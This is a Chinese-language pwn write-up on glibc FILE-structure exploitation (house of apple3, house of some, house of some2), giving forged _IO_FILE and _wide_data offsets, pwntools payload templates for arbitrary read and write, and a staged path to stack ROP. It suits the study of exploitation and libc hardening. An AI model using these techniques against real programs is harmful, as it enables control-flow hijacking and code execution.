第一个_IO_FILE结构体执行_IO_OVERFLOW的时候，利用_IO_wstrn_overflow函数修改tcache全局变量为已知值，也就控制了tcache bin的分配
第二个_IO_FILE结构体执行_IO_OVERFLOW的时候，利用_IO_str_overflow中的malloc函数任意地址分配，并使用memcpy使得能够任意地址写任意值
利用两次任意地址写任意值修改pointer_guard和IO_accept_foreign_vtables的值绕过_IO_vtable_check函数的检测（或者利用一次任意地址写任意值修改libc.got里面的函数地址，很多IO流函数调用strlen/strcpy/memcpy/memset等都会调到libc.got里面的函数）
利用一个_IO_FILE，随意伪造vtable劫持程序控制流即可

修改mp_结构体

伪造至少两个_IO_FILE结构体
第一个_IO_FILE结构体执行_IO_OVERFLOW的时候，利用_IO_wstrn_overflow函数修改mp_.tcache_bins为很大的值，使得很大的chunk也通过tcachebin去管理
接下来的过程与上面的思路是一样的

修改pointer_guard线程变量+house of emma

伪造两个_IO_FILE结构体
第一个_IO_FILE结构体执行_IO_OVERFLOW的时候，利用_IO_wstrn_overflow函数修改tls结构体pointer_guard的值为已知值
第二个_IO_FILE结构体用来做house of emma利用即可控制程序执行流

修改global_max_fast全局变量
修改掉这个变量后，直接释放超大的chunk，去覆盖掉point_guard或者tcache变量
house of apple3
FILE结构体中有一个成员struct _IO_codecvt *_codecvt;，偏移为0x98。该结构体参与宽字符的转换工作，结构体相关定义如下： struct _IO_codecvt&#123;  _IO_iconv_t __cd_in;  _IO_iconv_t __cd_out;&#125;;typedef struct&#123;  struct __gconv_step *step;  struct __gconv_step_data step_data;&#125; _IO_iconv_t;struct __gconv_step&#123;  struct __gconv_loaded_object *__shlib_handle;  const char *__modname;  /* For internal use by glibc.  (Accesses to this member must occur     when the internal __gconv_lock mutex is acquired).  */  int __counter;  char *__from_name;  char *__to_name;  __gconv_fct __fct;  __gconv_btowc_fct __btowc_fct;  __gconv_init_fct __init_fct;  __gconv_end_fct __end_fct;  /* Information about the number of bytes needed or produced in this     step.  This helps optimizing the buffer sizes.  */  int __min_needed_from;  int __max_needed_from;  int __min_needed_to;  int __max_needed_to;  /* Flag whether this is a stateful encoding or not.  */  int __stateful;  void *__data;		/* Pointer to step-local data.  */&#125;;struct __gconv_step_data&#123;  unsigned char *__outbuf;    /* Output buffer for this step.  */  unsigned char *__outbufend; /* Address of first byte after the output				 buffer.  */  /* Is this the last module in the chain.  */  int __flags;  /* Counter for number of invocations of the module function for this     descriptor.  */  int __invocation_counter;  /* Flag whether this is an internal use of the module (in the mb*towc*     and wc*tomb* functions) or regular with iconv(3).  */  int __internal_use;  __mbstate_t *__statep;  __mbstate_t __state;	/* This element must not be used directly by			   any module; always use STATEP!  */&#125;; house of apple3的利用主要关注以下三个函数：__libio_codecvt_out、__libio_codecvt_in和__libio_codecvt_length。三个函数的利用点都差不多，以__libio_codecvt_in为例，源码分析如下： enum __codecvt_result__libio_codecvt_in (struct _IO_codecvt *codecvt, __mbstate_t *statep,            const char *from_start, const char *from_end,            const char **from_stop,            wchar_t *to_start, wchar_t *to_end, wchar_t **to_stop)&#123;  enum __codecvt_result result;  // gs 源自第一个参数  struct __gconv_step *gs = codecvt-&gt;__cd_in.step;  int status;  size_t dummy;  const unsigned char *from_start_copy = (unsigned char *) from_start;   codecvt-&gt;__cd_in.step_data.__outbuf = (unsigned char *) to_start;  codecvt-&gt;__cd_in.step_data.__outbufend = (unsigned char *) to_end;  codecvt-&gt;__cd_in.step_data.__statep = statep;   __gconv_fct fct = gs-&gt;__fct;#ifdef PTR_DEMANGLE  // 如果gs-&gt;__shlib_handle不为空，则会用__pointer_guard去解密  // 这里如果可控，设置为NULL即可绕过解密  if (gs-&gt;__shlib_handle != NULL)    PTR_DEMANGLE (fct);#endif  // 这里有函数指针调用  // 这个宏就是调用fct(gs, ...)  status = DL_CALL_FCT (fct,            (gs, &amp;codecvt-&gt;__cd_in.step_data, &amp;from_start_copy,             (const unsigned char *) from_end, NULL,             &amp;dummy, 0, 0));       // ......&#125; 其中，__gconv_fct和DL_CALL_FCT被定义为： /* Type of a conversion function.  */typedef int (*__gconv_fct) (struct __gconv_step *, struct __gconv_step_data *,                const unsigned char **, const unsigned char *,                unsigned char **, size_t *, int, int); #ifndef DL_CALL_FCT# define DL_CALL_FCT(fct, args) fct args#endif #### _IO_wfile_underflow

调用链


_IO_wfile_underflow wint_t_IO_wfile_underflow (FILE *fp)&#123;  struct _IO_codecvt *cd;  enum __codecvt_result status;  ssize_t count;   /* C99 requires EOF to be &quot;sticky&quot;.  */   // 不能进入这个分支  if (fp-&gt;_flags &amp; _IO_EOF_SEEN)    return WEOF;  // 不能进入这个分支  if (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))    &#123;      fp-&gt;_flags |= _IO_ERR_SEEN;      __set_errno (EBADF);      return WEOF;    &#125;  // 不能进入这个分支  if (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)    return *fp-&gt;_wide_data-&gt;_IO_read_ptr;   cd = fp-&gt;_codecvt;   // 需要进入这个分支  /* Maybe there is something left in the external buffer.  */  if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)    &#123;      /* There is more in the external.  Convert it.  */      const char *read_stop = (const char *) fp-&gt;_IO_read_ptr;       fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;      fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =    fp-&gt;_wide_data-&gt;_IO_buf_base;    // 需要一路调用到这里      status = __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,                   fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,                   &amp;read_stop,                   fp-&gt;_wide_data-&gt;_IO_read_ptr,                   fp-&gt;_wide_data-&gt;_IO_buf_end,                   &amp;fp-&gt;_wide_data-&gt;_IO_read_end);           // ......    &#125;&#125;
__libio_codecvt_in
DL_CALL_FCT
gs = fp-&gt;_codecvt-&gt;__cd_in.step
*(gs-&gt;__fct)(gs)

综上所述： * _flags设置为~(4 | 0x10) * vtable设置为_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap地址（加减偏移），使其能成功调用_IO_wfile_underflow即可 * fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end，即满足*(fp + 8) &lt; *(fp + 0x10) * _wide_data保持默认，或者设置为可控堆地址A，即满足*(fp + 0xa0) = A * _wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end，即满足*A &gt;= *(A + 8) * _codecvt设置为可控堆地址B，即满足*(fp + 0x98) = B * codecvt-&gt;__cd_in.step设置为可控堆地址C，即满足*B = C * codecvt-&gt;__cd_in.step-&gt;__shlib_handle设置为0，即满足*C = 0 * codecvt-&gt;__cd_in.step-&gt;__fct设置为地址D,地址D用于控制rip，即满足*(C + 0x28) = D。当调用到D的时候，此时的rdi为C。如果_wide_data也可控的话，rsi也能控制
_IO_wfile_underflow_mmap

调用链


_IO_wfile_underflow_mmap static wint_t_IO_wfile_underflow_mmap (FILE *fp)&#123;  struct _IO_codecvt *cd;  const char *read_stop;  // 不能进入这个分支  if (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))    &#123;      fp-&gt;_flags |= _IO_ERR_SEEN;      __set_errno (EBADF);      return WEOF;    &#125;  // 不能进入这个分支  if (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)    return *fp-&gt;_wide_data-&gt;_IO_read_ptr;   cd = fp-&gt;_codecvt;   /* Maybe there is something left in the external buffer.  */  // 最好不要进入这个分支  if (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end      /* No.  But maybe the read buffer is not fully set up.  */      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)    /* Nothing available.  _IO_file_underflow_mmap has set the EOF or error       flags as appropriate.  */    return WEOF;   /* There is more in the external.  Convert it.  */  read_stop = (const char *) fp-&gt;_IO_read_ptr;   // 最好不要进入这个分支  if (fp-&gt;_wide_data-&gt;_IO_buf_base == NULL)    &#123;      /* Maybe we already have a push back pointer.  */      if (fp-&gt;_wide_data-&gt;_IO_save_base != NULL)    &#123;      free (fp-&gt;_wide_data-&gt;_IO_save_base);      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;    &#125;      _IO_wdoallocbuf (fp);// 需要走到这里    &#125;  fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;  fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =    fp-&gt;_wide_data-&gt;_IO_buf_base;     // 需要调用到这里  __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,              fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,              &amp;read_stop,              fp-&gt;_wide_data-&gt;_IO_read_ptr,              fp-&gt;_wide_data-&gt;_IO_buf_end,              &amp;fp-&gt;_wide_data-&gt;_IO_read_end);    //......&#125; 满足条件：


fp-&gt;_flags &amp; _IO_NO_READS == 0
fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end
fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end
fp-&gt;_wide_data-&gt;_IO_buf_base != NULL


__libio_codecvt_in
DL_CALL_FCT
gs = fp-&gt;_codecvt-&gt;__cd_in.step
*(gs-&gt;__fct)(gs)

综上所述： * _flags设置为~4 * vtable设置为_IO_wfile_jumps_mmap地址（加减偏移），使其能成功调用_IO_wfile_underflow_mmap即可 * fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end，即满足*(fp + 8) &lt; *(fp + 0x10) * _wide_data保持默认，或者设置为可控堆地址A，即满足*(fp + 0xa0) = A * _wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end，即满足*A &gt;= *(A + 8) * _wide_data-&gt;_IO_buf_base设置为非0，即满足*(A + 0x30) != 0 * _codecvt设置为可控堆地址B，即满足*(fp + 0x98) = B * codecvt-&gt;__cd_in.step设置为可控堆地址C，即满足*B = C * codecvt-&gt;__cd_in.step-&gt;__shlib_handle设置为0，即满足*C = 0 * codecvt-&gt;__cd_in.step-&gt;__fct设置为地址D,地址D用于控制rip，即满足*(C + 0x28) = D。当调用到D的时候，此时的rdi为C，如果_wide_data也可控的话，rsi也能控制
_IO_wdo_write

调用链


_IO_new_file_sync int_IO_new_file_sync (FILE *fp)&#123;  ssize_t delta;  int retval = 0;   /*    char* ptr = cur_ptr(); */  if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)    if (_IO_do_flush(fp)) return EOF;//调用到这里    //......&#125; 满足条件：


fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base


_IO_do_flush #define _IO_do_flush(_f) \  ((_f)-&gt;_mode &lt;= 0                                  \   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,                      \          (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)              \   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,              \           ((_f)-&gt;_wide_data-&gt;_IO_write_ptr                  \            - (_f)-&gt;_wide_data-&gt;_IO_write_base))) 满足条件：


fp-&gt;_mode &gt; 0
此时的第二个参数为fp-&gt;_wide_data-&gt;_IO_write_base
第三个参数为fp-&gt;_wide_data-&gt;_IO_write_ptr - fp-&gt;_wide_data-&gt;_IO_write_base


_IO_wdo_write int_IO_wdo_write (FILE *fp, const wchar_t *data, size_t to_do)&#123;  struct _IO_codecvt *cc = fp-&gt;_codecvt;   // 第三个参数必须要大于0  if (to_do &gt; 0)    &#123;      if (fp-&gt;_IO_write_end == fp-&gt;_IO_write_ptr      &amp;&amp; fp-&gt;_IO_write_end != fp-&gt;_IO_write_base)    &#123;// 不能进入这个分支      if (_IO_new_do_write (fp, fp-&gt;_IO_write_base,                fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) == EOF)        return WEOF;    &#125;   // ......       /* Now convert from the internal format into the external buffer.  */    // 需要调用到这里      result = __libio_codecvt_out (cc, &amp;fp-&gt;_wide_data-&gt;_IO_state,                    data, data + to_do, &amp;new_data,                    write_ptr,                    buf_end,                    &amp;write_ptr);          //......  &#125;&#125; 满足条件：


fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base
fp-&gt;_IO_write_end == fp-&gt;_IO_write_ptr &amp;&amp; fp-&gt;_IO_write_end != fp-&gt;_IO_write_base为假


__libio_codecvt_out
DL_CALL_FCT
`gs = fp-&gt;_codecvt-&gt;__cd_out.step
*(gs-&gt;__fct)(gs)

综上所述： * _flags设置为~4 * vtable设置为_IO_file_jumps地址（加减偏移），使其能成功调用_IO_new_file_sync即可 * _mode &gt; 0，即满足(fp + 0xc0) &gt; 0 * _IO_write_end != _IO_write_ptr或者_IO_write_end == _IO_write_base，即满足*(fp + 0x30) != *(fp + 0x28)或者*(fp + 0x30) == *(fp + 0x20) * _wide_data设置为堆地址，假设地址为A，即满足*(fp + 0xa0) = A * _wide_data-&gt;_IO_write_ptr &gt;= _wide_data-&gt;_IO_write_base，即满足*(A + 0x20) &gt;= *(A + 0x18) * _codecvt设置为可控堆地址B，即满足*(fp + 0x98) = B * codecvt-&gt;__cd_in.step设置为可控堆地址C，即满足*B = C * codecvt-&gt;__cd_in.step-&gt;__shlib_handle设置为0，即满足*C = 0 * codecvt-&gt;__cd_in.step-&gt;__fct设置为地址D,地址D用于控制rip，即满足*(C + 0x28) = D。当调用到D的时候，此时的rdi为C，如果_wide_data也可控的话，rsi也能控制
_IO_wfile_sync

调用链


_IO_wfile_sync wint_t_IO_wfile_sync (FILE *fp)&#123;  ssize_t delta;  wint_t retval = 0;   /*    char* ptr = cur_ptr(); */  // 不要进入这个分支  if (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)    if (_IO_do_flush (fp))      return WEOF;  delta = fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end;  // 需要进入到这个分支  if (delta != 0)    &#123;      /* We have to find out how many bytes we have to go back in the     external buffer.  */      struct _IO_codecvt *cv = fp-&gt;_codecvt;      off64_t new_pos;       // 这里直接返回-1即可      int clen = __libio_codecvt_encoding (cv);       if (clen &gt; 0)    /* It is easy, a fixed number of input bytes are used for each       wide character.  */    delta *= clen;      else    &#123;      /* We have to find out the hard way how much to back off.         To do this we determine how much input we needed to         generate the wide characters up to the current reading         position.  */      int nread;      size_t wnread = (fp-&gt;_wide_data-&gt;_IO_read_ptr               - fp-&gt;_wide_data-&gt;_IO_read_base);      fp-&gt;_wide_data-&gt;_IO_state = fp-&gt;_wide_data-&gt;_IO_last_state;    // 调用到这里      nread = __libio_codecvt_length (cv, &amp;fp-&gt;_wide_data-&gt;_IO_state,                      fp-&gt;_IO_read_base,                      fp-&gt;_IO_read_end, wnread);            // ......   &#125;    &#125;&#125; 满足条件：


fp-&gt;_wide_data-&gt;_IO_write_ptr &lt;= fp-&gt;_wide_data-&gt;_IO_write_base
fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end != 0
clen &lt;= 0 int__libio_codecvt_encoding (struct _IO_codecvt *codecvt)&#123;  /* See whether the encoding is stateful.  */  if (codecvt-&gt;__cd_in.step-&gt;__stateful)    return -1;  /* Fortunately not.  Now determine the input bytes for the conversion     necessary for each wide character.  */  if (codecvt-&gt;__cd_in.step-&gt;__min_needed_from      != codecvt-&gt;__cd_in.step-&gt;__max_needed_from)    /* Not a constant value.  */    return 0;   return codecvt-&gt;__cd_in.step-&gt;__min_needed_from;&#125;
fp-&gt;codecvt-&gt;__cd_in.step-&gt;__stateful != 0


__libio_codecvt_length
DL_CALL_FCT
`gs = fp-&gt;_codecvt-&gt;__cd_out.step
*(gs-&gt;__fct)(gs)

综上所述： * _flags设置为~(4 | 0x10) * vtable设置为_IO_wfile_jumps地址（加减偏移），使其能成功调用_IO_wfile_sync即可 * _wide_data设置为堆地址，假设地址为A，即满足*(fp + 0xa0) = A * _wide_data-&gt;_IO_write_ptr &lt;= _wide_data-&gt;_IO_write_base，即满足*(A + 0x20) &lt;= *(A + 0x18) * _wide_data-&gt;_IO_read_ptr != _wide_data-&gt;_IO_read_end，即满足*A != *(A + 8) * _codecvt设置为可控堆地址B，即满足*(fp + 0x98) = B * codecvt-&gt;__cd_in.step设置为可控堆地址C，即满足*B = C * codecvt-&gt;__cd_in.step-&gt;__stateful设置为非0，即满足*(B + 0x58) != 0 * codecvt-&gt;__cd_in.step-&gt;__shlib_handle设置为0，即满足*C = 0 * codecvt-&gt;__cd_in.step-&gt;__fct设置为地址D,地址D用于控制rip，即满足*(C + 0x28) = D。当调用到D的时候，此时的rdi为C，如果rsi为&amp;codecvt-&gt;__cd_in.step_data可控
house of some(house of apple2 plus)

利用条件

已知glibc基地址
可控的已知地址（可写入内容构造fake_IO_file）
需要一次libc内任意地址写可控地址
程序能正常退出或者通过exit()退出

优点：

无视目前的IO_validate_vtable检查（wide_data的vtable加上检查也可以打）
第一次任意地址写要求低
最后攻击提权是栈上ROP，可以不需要栈迁移
源码级攻击，不依赖编译结果


利用_IO_new_file_underflow这个函数 int  _IO_new_file_underflow (FILE *fp)  &#123;    ssize_t count;      /* C99 requires EOF to be &quot;sticky&quot;.  */    if (fp-&gt;_flags &amp; _IO_EOF_SEEN)      return EOF;      if (fp-&gt;_flags &amp; _IO_NO_READS)      &#123;        fp-&gt;_flags |= _IO_ERR_SEEN;        __set_errno (EBADF);        return EOF;      &#125;    if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)      return *(unsigned char *) fp-&gt;_IO_read_ptr;      if (fp-&gt;_IO_buf_base == NULL)      &#123;        /* Maybe we already have a push back pointer.  */        if (fp-&gt;_IO_save_base != NULL)  	&#123;  	  free (fp-&gt;_IO_save_base);  	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;  	&#125;        _IO_doallocbuf (fp);      &#125;      /* FIXME This can/should be moved to genops ?? */    if (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))      &#123;        /* We used to flush all line-buffered stream.  This really isn&#x27;t  	 required by any standard.  My recollection is that  	 traditional Unix systems did this for stdout.  stderr better  	 not be line buffered.  So we do just that here  	 explicitly.  --drepper */        _IO_acquire_lock (stdout);          if ((stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))  	  == (_IO_LINKED | _IO_LINE_BUF))  	_IO_OVERFLOW (stdout, EOF);          _IO_release_lock (stdout);      &#125;      _IO_switch_to_get_mode (fp);      /* This is very tricky. We have to adjust those       pointers before we call _IO_SYSREAD () since       we may longjump () out while waiting for       input. Those pointers may be screwed up. H.J. */    fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;    fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end      = fp-&gt;_IO_buf_base;      count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,  		       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);    if (count &lt;= 0)      &#123;        if (count == 0)  	fp-&gt;_flags |= _IO_EOF_SEEN;        else  	fp-&gt;_flags |= _IO_ERR_SEEN, count = 0;    &#125;    fp-&gt;_IO_read_end += count;    if (count == 0)      &#123;        /* If a stream is read to EOF, the calling application may switch active  	 handles.  As a result, our offset cache would no longer be valid, so  	 unset it.  */        fp-&gt;_offset = _IO_pos_BAD;        return EOF;      &#125;    if (fp-&gt;_offset != _IO_pos_BAD)      _IO_pos_adjust (fp-&gt;_offset, count);    return *(unsigned char *) fp-&gt;_IO_read_ptr;  &#125; 会调用_IO_SYSREAD (fp, fp-&gt;_IO_buf_base,fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)宏其对应的常规read函数如下 ssize_t  _IO_file_read (FILE *fp, void *buf, ssize_t size)  &#123;    return (__builtin_expect (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL, 0)  	  ? __read_nocancel (fp-&gt;_fileno, buf, size)  	  : __read (fp-&gt;_fileno, buf, size));  &#125; read的三个参数都是可控的 - fd=&gt;fp-&gt;_fileno - buf=&gt;fp-&gt;_IO_buf_base - size=&gt;fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base
其中的for循环我们可以看到对于_IO_list_all上的单向链表，通过了_chain串起来，并在_IO_flush_all中，会遍历链表上每一个FILE，如果条件成立，就可以调用_IO_OVERFLOW(fp, EOF)
由于_IO_new_file_underflow内有一个_IO_switch_to_get_mode函数其中有这个分支 if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)      if (_IO_OVERFLOW (fp, EOF) == EOF)        return EOF; 如果还是使用fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base来使得触发OVERFLOW就会出现无限递归，所以不可行，我们需要采取另一个分支，即 if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) // 不可行  	   || (_IO_vtable_offset (fp) == 0                      // 使用||之后的分支  	       &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr  				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))  	   )  	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) 实现任意地址读的条件 - _flags设置为~(2 | 0x8 | 0x800)，设置为0即可（与apple2相同） - vtable设置为_IO_wfile_jumps/_IO_wfile_jumps_mmap地址，使得调用_IO_wfile_overflow即可（注意此处与apple2不同的是，此处的vtable不能加偏移，否则会打乱_IO_SYSREAD的调用） - _wide_data-&gt;_IO_write_base设置为0，即满足*(_wide_data + 0x18) = 0（与apple2相同） - _wide_data-&gt;_IO_write_ptr设置为大于_wide_data-&gt;_IO_write_base，即满足*(_wide_data + 0x20) &gt; *(_wide_data + 0x18)（注意此处不同） - _wide_data-&gt;_IO_buf_base设置为0，即满足*(_wide_data + 0x30) = 0（与apple2相同） - _wide_data-&gt;_wide_vtable设置为任意一个包含_IO_new_file_underflow，其中原生的vtable就有，设置成_IO_file_jumps-0x48即可 - _vtable_offset设置为0 - _IO_buf_base与_IO_buf_end设置为你需要写入的地址范围 - _chain设置为你下一个触发的fake file地址 - _IO_write_ptr &lt;= _IO_write_base即可 - _fileno设置为0，表示read(0, buf, size) - _mode设置为2，满足fp-&gt;_mode &gt; 0即可
任意地址写 fake_file_read = flat(&#123;      0x00: 0, # _flags      0x20: 0, # _IO_write_base      0x28: 0, # _IO_write_ptr            0x38: 任意地址写的起始地址, # _IO_buf_base      0x40: 任意地址写的终止地址, # _IO_buf_end  	      0x70: 0, # _fileno      0x82: b&quot;\x00&quot;, # _vtable_offset      0xc0: 2, # _mode      0xa0: wide_data的地址, # _wide_data      0x68: 下一个调用的fake file地址, # _chain      0xd8: _IO_wfile_jumps, # vtable  &#125;, filler=b&quot;\x00&quot;)    fake_wide_data = flat(&#123;      0xe0: _IO_file_jumps - 0x48,      0x18: 0,      0x20: 1,      0x30: 0,  &#125;, filler=b&quot;\x00&quot;) 任意地址读 fake_file_write = flat(&#123;      0x00: 0x800 | 0x1000, # _flags            0x20: 需要泄露的起始地址, # _IO_write_base      0x28: 需要泄露的终止地址, # _IO_write_ptr        0x70: 1, # _fileno      0x68: 下一个调用的fake file地址, # _chain      0xd8: _IO_file_jumps, # vtable  &#125;, filler=b&quot;\x00&quot;)
攻击流程

第一步：任意地址写_chain，这里可以写_IO_list_all或者stdin、stdout、stderr的_chain位置，在这一步需要在可控地址上布置一个任意地址写的fake_IO_file，之后将fake_IO_file地址写入上述位置
第二步：扩展fake_IO_file链条并泄露栈地址，在第一步的中，我们只有一个fake_IO_file，并不能完成更复杂的操作，所以这一步我们需要写入两个fake_IO_file，一个用于泄露environ内的值（即栈地址），另一个用于写入下一个fake_IO_file
第三步：泄露栈内数据，并寻找ROP起始地址，这一步同样需要写入两个fake_IO_file，一个任意地址读，读取栈上内存，另一个任意地址写，向栈上写ROP
第四步：写入ROP，实现栈上ROP攻击！ [[./houseofsome1.png]]

house of some2
主要关注的函数是_IO_wfile_jumps_maybe_mmap中的_IO_wfile_underflow_maybe_mmap
利用条件为 1. 已知libc地址 2. 可控地址(可写入fake file) 3. 可控stdout指针或者_IO_2_1_stdout_结构体 4. 程序具有printf或者puts输出函数
优点如下 1. 与House of Some一样可以绕过目前的vtable检查 2. printf和puts比较普遍，适用性广 3. 可以在栈上劫持控制流，衔接House of Some，完成最后攻击
先关注_IO_wfile_underflow_maybe_mmap函数 wint_t  _IO_wfile_underflow_maybe_mmap (FILE *fp)  &#123;    /* This is the first read attempt.  Doing the underflow will choose mmap       or vanilla operations and then punt to the chosen underflow routine.       Then we can punt to ours.  */    if (_IO_file_underflow_maybe_mmap (fp) == EOF)      return WEOF;      return _IO_WUNDERFLOW (fp);  &#125; 最后调用了_wide_data内的虚表_IO_WUNDERFLOW 那么继续深入_IO_file_underflow_maybe_mmap函数 int  _IO_file_underflow_maybe_mmap (FILE *fp)  &#123;    /* This is the first read attempt.  Choose mmap or vanilla operations       and then punt to the chosen underflow routine.  */    decide_maybe_mmap (fp);    return _IO_UNDERFLOW (fp);  &#125; 最后调用了FILE的虚表_IO_UNDERFLOW 继续深入decide_maybe_mmap函数 static void  decide_maybe_mmap (FILE *fp)  &#123;    /* We use the file in read-only mode.  This could mean we can       mmap the file and use it without any copying.  But not all       file descriptors are for mmap-able objects and on 32-bit       machines we don&#x27;t want to map files which are too large since       this would require too much virtual memory.  */    struct __stat64_t64 st;      if (_IO_SYSSTAT (fp, &amp;st) == 0        &amp;&amp; S_ISREG (st.st_mode) &amp;&amp; st.st_size != 0        /* Limit the file size to 1MB for 32-bit machines.  */        &amp;&amp; (sizeof (ptrdiff_t) &gt; 4 || st.st_size &lt; 1*1024*1024)        /* Sanity check.  */        &amp;&amp; (fp-&gt;_offset == _IO_pos_BAD || fp-&gt;_offset &lt;= st.st_size))      &#123;        /* Try to map the file.  */        void *p;        ... 这里主要就是做了mmap      &#125;      /* We couldn&#x27;t use mmap, so revert to the vanilla file operations.  */      if (fp-&gt;_mode &lt;= 0)      _IO_JUMPS_FILE_plus (fp) = &amp;_IO_file_jumps;    else      _IO_JUMPS_FILE_plus (fp) = &amp;_IO_wfile_jumps;    fp-&gt;_wide_data-&gt;_wide_vtable = &amp;_IO_wfile_jumps;  &#125; 有一个关键的_IO_SYSSTAT调用，以及，在这个函数最后会恢复FILE和_wide_data的虚表
整理一下可以知道，如果一个FILE进入了函数_IO_wfile_underflow_maybe_mmap，那么他将会运行如下的流程 1. _IO_SYSSTAT(fp, &amp;st)调用虚表，传入栈指针 2. decide_maybe_mmap函数结束，恢复两个虚表 3. _IO_UNDERFLOW (fp)调用虚表 4. _IO_WUNDERFLOW (fp)调用虚表
在_IO_file_jumps虚表的_IO_UNDERFLOW 函数中 count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,         fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base); 这一步，三个参数都可控，也就是可以写入任意地址
在printf和puts函数中，最后会调用stdout的__xsputn虚表的入口 如果我们使得__xsputn的偏移直接指向__underflow呢？ 那么就会得到如下的偏移 __xsputn -&gt; __underflow  __stat   -&gt; __write 此时，修改stdout的虚表为_IO_wfile_jumps_maybe_mmap-0x18
在上述调用过程中_IO_SYSSTAT(fp, &amp;st)这个函数就会变成write(fp, &amp;st, ??) 如果我们能够控制rdx就好了，这里就能做到栈数据泄露
能够控制的也就只有后续调用的_IO_UNDERFLOW (fp)中的_IO_SYSREAD (fp, fp-&gt;_IO_buf_base,fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);可以控制，由于decide_maybe_mmap会强制恢复虚表，所以这里我们不用担心篡改虚表带来的影响
如果rdx不可控直接执行write(fp, &amp;st, ??)会怎么样，返回0或者非0 那么回到decide_maybe_mmap
这里判断，如果_IO_SYSSTAT (fp, &amp;st)返回0，那么直接就不会进入if，如果返回不为0，我们看看S_ISREG的定义
#define	__S_ISTYPE(mode, mask)	(((mode) &amp; __S_IFMT) == (mask))  #define	S_ISREG(mode)	 __S_ISTYPE((mode), __S_IFREG)
这里可以看到最后判断采用的是==判断，由于栈上数据的限制，这里通过判断的概率不高
以及还有st.st_size != 0判断，在没有正确执行stat逻辑，栈维持原貌的情况下，这个if通过概率不高
如果还高，可以控制fp-&gt;_offset == _IO_pos_BAD || fp-&gt;_offset &lt;= st.st_size为假即可
那么就能顺利的执行完decide_maybe_mmap，并且保留伪造的fp内容没有任何变动
接下来就是调用_IO_file_jumps虚表的_IO_UNDERFLOW ，操作执行read
这里，我们可以设置，注意fake_file_start就是我们当前控制的fp地址
_IO_buf_base = fake_file_start  _IO_buf_end  = fake_file_start + 0x1c8 // 这里的1c8包括了widedata的长度
那么，这里我们就能再次重新复写fake，并扩大可控长度，widedata都可控了
回到上面执行流程，接下来就会执行_IO_WUNDERFLOW (fp)这个虚表函数了
然而，上述我们通过underflow重新控制了fp，也就是接下来的这个虚表函数，我们也是可控的
这里我们控制为_IO_WUNDERFLOW(fp) -&gt; _IO_wfile_underflow_maybe_mmap
我们再次回到了起点，但是这次不一样了 在上一个小节，其实我们已经控制了rdx，因为_IO_SYSREAD (fp, fp-&gt;_IO_buf_base,fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)的第三个参数rdx = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base
